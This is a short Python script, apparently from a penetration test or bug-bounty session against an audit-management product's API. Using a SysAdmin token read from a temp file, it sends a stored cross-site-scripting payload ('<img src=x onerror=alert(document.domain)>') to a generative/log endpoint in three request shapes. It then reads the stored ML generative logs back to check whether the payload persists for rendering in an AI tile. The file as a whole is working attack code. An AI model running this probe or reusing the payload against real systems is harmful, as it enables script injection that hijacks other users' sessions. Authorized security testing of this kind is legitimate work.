import json,subprocess,os,uuid,time
H=os.environ['H']; BB=os.environ['BB']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def req(m,p,body=None,tok=None):
    cmd=['curl','-s','-m','90','-o','/tmp/b','-w','%{http_code}','-X',m,H+p,
         '-H','token: '+(tok or TOK),'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System']
    if body is not None: cmd+=['-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
print("=== generative/log: does it persist generatedOutput that renders in the AI tile? ===")
tag='ZXG'+uuid.uuid4().hex[:5]
pay=f'<img src=x onerror=alert(document.domain)>{tag}'
for body in [
  {"generatedOutput":pay,"context":{"module":"narrative"},"versionContext":{"feature":"narrative-generation"}},
  {"generated_output":pay,"context":{},"version_context":{}},
  {"generatedOutput":pay},
]:
    c,b=req('POST','/api/v1/generative/log',body)
    print(f"  POST generative/log -> {c} {b[:130].replace(chr(10),' ')}")
print()
print("=== ml_generative_logs readback (SysAdmin has access) ===")
c,b=req('GET','/api/v1/ml_generative_logs')
print(f"  {c} len={len(b)}")
if c=='200':
    try:
        logs=json.loads(b).get('ml_generative_logs') or []
        print(f"  rows={len(logs)}")
        for l in logs[:3]:
            print(f"    id={l.get('id')} output={str(l.get('generated_output'))[:80]!r}")
    except Exception as e: print("  ",e)
